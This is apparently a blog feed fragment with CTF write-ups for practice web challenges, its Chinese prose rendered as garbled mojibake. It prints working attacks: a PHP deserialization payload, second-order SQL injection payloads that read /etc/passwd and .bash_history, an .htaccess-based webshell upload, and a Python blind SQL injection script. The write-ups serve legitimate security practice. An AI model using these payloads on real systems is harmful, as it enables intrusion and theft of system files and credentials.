class="line">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF/4.png" class="" title="examplename"><p>è¿™é‡Œæœ‰æç¤ºï¼Œhostå¿…é¡»è¦end with 123</p><p>ç»§ç»­ä¿®æ”¹ï¼Œå¾—åˆ°flag</p><img src="/2020/05/24/GKCTF/5.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‰è¨€ï¼š&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="GKï¼ï¼" scheme="http://yoursite.com/tags/GK%EF%BC%81%EF%BC%81/"/>
    
  </entry>
  
  <entry>
    <title>buuoj3</title>
    <link href="http://yoursite.com/2020/05/16/buuoj3/"/>
    <id>http://yoursite.com/2020/05/16/buuoj3/</id>
    <published>2020-05-16T14:34:22.000Z</published>
    <updated>2020-05-25T16:12:12.315Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01ï¼š-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#0X01ï¼š-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="0X01ï¼š[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>0X01ï¼š[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz<a id="more"></a></h4><p>è¿™é“é¢˜å½“å¤©æ¯”èµ›çš„æ—¶å€™å°±å¤§æ¦‚çœ‹äº†ä¸€ä¸‹ï¼Œç°åœ¨buuä¸Šå¤ç°äº†å‘ç°ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œæ¥çœ‹çœ‹å§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ï¼Œå¯¹ä¼ å…¥çš„strå‚æ•°è¿›è¡Œååºåˆ—åŒ–ï¼Œå­—ç¬¦çš„ASCIIéƒ½è¦åœ¨32~125ä¹‹é—´</p><p>ååºåˆ—åŒ–ä¼šè°ƒç”¨__destructææ„æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ===æ˜¯å¼ºæ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯è¯´å­—ç¬¦å€¼å’Œç±»å‹éƒ½è¦ç›¸åŒï¼Œå¦‚æœä¸åŒå°±è¿›å…¥process()å‡½æ•°ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä»è¿™å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æƒ³è¦è¯»å–æ–‡ä»¶ï¼Œé‚£ä¹ˆopçš„å€¼è¦ä¸º2ï¼Œåˆšå¥½è¿™é‡Œæ˜¯ç”¨çš„è‹¥æ¯”è¾ƒï¼Œç›´æ¥è®©op=2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       $res = <span class="string">""</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">           $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>readå‡½æ•°ä¸­çš„filenameæ˜¯å¯æ§çš„ï¼Œèµ‹å€¼ä¸ºflag.phpï¼Œå†ä»¥outputå‡½æ•°è¾“å‡º</p><p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œprotectå¯¹è±¡åºåˆ—åŒ–æ—¶ä¼šæœ‰%00,%00å¯¹åº”çš„asciiå€¼ä¸º0ä¸åœ¨é‚£ä¸ªèŒƒå›´å†…ï¼Œæ‰¾èµ„æ–™å‘ç°php7.1å¯¹äºå±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ”¹ä¸ºpublic</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure><p>ç»™strä¼ å…¥åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨æºç å¤„æ‰¾åˆ°flag</p><h4 id="0X02ï¼š-ç½‘é¼æ¯-2018-Comment"><a href="#0X02ï¼š-ç½‘é¼æ¯-2018-Comment" class="headerlink" title="0X02ï¼š[ç½‘é¼æ¯ 2018]Comment"></a>0X02ï¼š[ç½‘é¼æ¯ 2018]Comment</h4><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç•™è¨€æ¿ç•Œé¢ï¼ŒF12æ‰¾åˆ°æç¤ºï¼šç¨‹åºå‘˜GITå†™ä¸€åŠè·‘è·¯äº†,éƒ½æ²¡æ¥å¾—åŠCommit :)</p><p>ç”¨githackæ‰¾åˆ°æ–‡ä»¶ï¼Œä½†æ˜¯åªæ˜¾ç¤ºäº†ä¸€éƒ¨åˆ†ï¼Œçœ‹äº†wpï¼Œç”¨çš„wyhå¸ˆå‚…çš„githackå¯ä»¥æ¢å¤ï¼Œæ‹¿åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);<span class="comment">//ç¬¬ä¸€æ¬¡è¿‡æ»¤</span></span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',//æœªè¿‡æ»¤ç›´æ¥ç”¨</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>addslashesç»•è¿‡æ–¹å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è®¾ç½®æ•°æ®åº“å­—ç¬¦ä¸ºgbkå¯¼è‡´å®½å­—èŠ‚æ³¨å…¥</span><br><span class="line">ä½¿ç”¨icon,mb_convert_encodingè½¬æ¢å­—ç¬¦ç¼–ç å‡½æ•°å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥</span><br><span class="line">urlè§£ç å¯¼è‡´ç»•è¿‡addslashes</span><br><span class="line">base64è§£ç å¯¼è‡´ç»•è¿‡addslashes</span><br><span class="line">jsonç¼–ç å¯¼è‡´ç»•è¿‡addslashes</span><br><span class="line">æ²¡æœ‰ä½¿ç”¨å¼•å·ä¿æŠ¤å­—ç¬¦ä¸²ï¼Œç›´æ¥æ— è§†addslashes</span><br><span class="line">ä½¿ç”¨äº†stripslashes(å»æ‰äº†\)</span><br><span class="line">å­—ç¬¦æ›¿æ¢å¯¼è‡´çš„ç»•è¿‡addslashes</span><br></pre></td></tr></table></figure><p>categoryåªè¿‡=è¿‡æ»¤äº†ä¸€æ¬¡ï¼ŒäºŒæ¬¡æ³¨å…¥</p><p>å°è¯•å‘å¸–ï¼Œè¦ç™»å½•ï¼Œè´¦å·å¯†ç å‘ŠçŸ¥ï¼Œå¯†ç åä¸‰ä½éœ€è¦çˆ†ç ´ï¼Œçˆ†ç ´å‡º666</p><p>è¿™é‡Œç”¨/**/æ¥æ³¨é‡Š</p><p>123â€™,content=user(),/*,è¯„è®ºä¸­å†™*/#å°±é—­åˆäº†è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'123'</span>,<span class="keyword">content</span>=<span class="keyword">user</span>(),<span class="comment">/*',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="comment">#',</span></span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢ç›´æ¥ç»™payloadï¼Œå°±ä¸å¤šè¯´äº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">',content=(<span class="keyword">select</span>( <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>))),<span class="comment">/*</span></span><br><span class="line"><span class="comment">',content=(select(load_file("/home/www/.bash_history"))),/*</span></span><br><span class="line"><span class="comment">',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*/</span>/å‘ç°é•¿åº¦ä¸å¤Ÿæ”¹ä¸º<span class="keyword">hex</span>è¯»å–</span><br><span class="line"><span class="string">',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/1.png" class="" title="examplename"><h4 id="0X03ï¼š-GXYCTF2019-BabyUpload"><a href="#0X03ï¼š-GXYCTF2019-BabyUpload" class="headerlink" title="0X03ï¼š[GXYCTF2019]BabyUpload"></a>0X03ï¼š[GXYCTF2019]BabyUpload</h4><p>æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥ä¸Šé©¬å…ˆè¯•è¯•</p><p>å‘ç°jpgæ–‡ä»¶ç›´æ¥ä¸Šä¼ æˆåŠŸäº†ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œå‘ç°ä¸è¡Œ</p><p>æ”¹ç”¨pngå¤±è´¥</p><p>ç»è¿‡å°è¯•å‘ç°.htaccessåœ¨æ”¹äº†content-typeä¹‹åèƒ½ä¸Šä¼ ï¼</p><img src="/2020/05/16/buuoj3/3.png" class="" title="examplename"><img src="/2020/05/16/buuoj3/2.png" class="" title="examplename"><p>ä¸Šä¼ æˆåŠŸäº†ï¼Œä¸‹é¢ä¸Šä¼ ä¹‹å‰çš„jpgæ–‡ä»¶åº”è¯¥èƒ½æˆåŠŸäº†</p><p>è¿™é‡Œæ³¨æ„çš„æ˜¯ï¼Œ&lt;?è¢«è¿‡æ»¤äº†ï¼Œä»¥jsçš„å½¢å¼å†™ğŸï¼Œä¸Šä¼ åç”¨èšå‰‘</p><img src="/2020/05/16/buuoj3/4.png" class="" title="examplename"><h4 id="0X04-CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#0X04-CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="0X04:[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>0X04:[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h4><p>æ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå¾¡å‰‘æ‰«æï¼Œå‘ç°äº†robots.txt,è®¿é—®</p><img src="/2020/05/16/buuoj3/5.png" class="" title="examplename"><p>æƒ³ä¸åˆ°æœ‰å•¥ï¼Œçœ‹äº†ç½‘é¡µæºç çœ‹åˆ°ä¸ªimageï¼ŒçŒœæµ‹å¯èƒ½ä¼šæ˜¯ï¼Œæ„å¤–ï¼Œæ‹¿åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ç”¨\\0å¯ä»¥è¾“å‡º\ï¼Œè¾¾åˆ°ç›®çš„</p><p>è¿™é“é¢˜çœ‹äº†wpï¼Œç”¨çš„æ˜¯ç›²æ³¨ï¼Œè¿™é‡Œç›´æ¥è´´ä¸€ä¸‹è„šæœ¬å§ï¼Œè‡ªå·±çœ‹çœ‹å°±æ‡‚å•¥æ„æ€äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://a733f818-a663-4ff3-9338-435c6195bf93.node3.buuoj.cn/image.php"</span></span><br><span class="line">response = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload = <span class="string">'or id = if(ascii(substr((select password from users limit 1 offset 0),%d,1))&gt;%d,1,0)#'</span>%(i,mid)</span><br><span class="line">        params=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'\\0'</span>,</span><br><span class="line">            <span class="string">'path'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        txt = requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'JFIF'</span> <span class="keyword">in</span> txt.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    response+=chr(int(mid))</span><br><span class="line">    print(response)</span><br></pre></td></tr></table></figure><p>æ³¨å‡ºçš„å¯†ç æ˜¯12a0811ae7c390765ab4ï¼Œè´¦æˆ·åç›´æ¥çŒœçš„adminï¼Œç™»å½•ï¼Œå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç”¨å°é©¬ä»¥jpgæ–‡ä»¶ä¸Šä¼ ï¼Œè¿æ¥ä¸ä¸Šï¼Œåˆ«çš„å¸ˆå‚…è¯´æ˜¯ç”¨çŸ­æ ‡ç­¾ï¼Œæ¥è¯•è¯•</p><img src="/2020/05/16/buuoj3/6.png" class="" title="examplename"><p>æˆåŠŸä¸Šä¼ äº†ï¼Œèšå‰‘æˆåŠŸè¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><h4 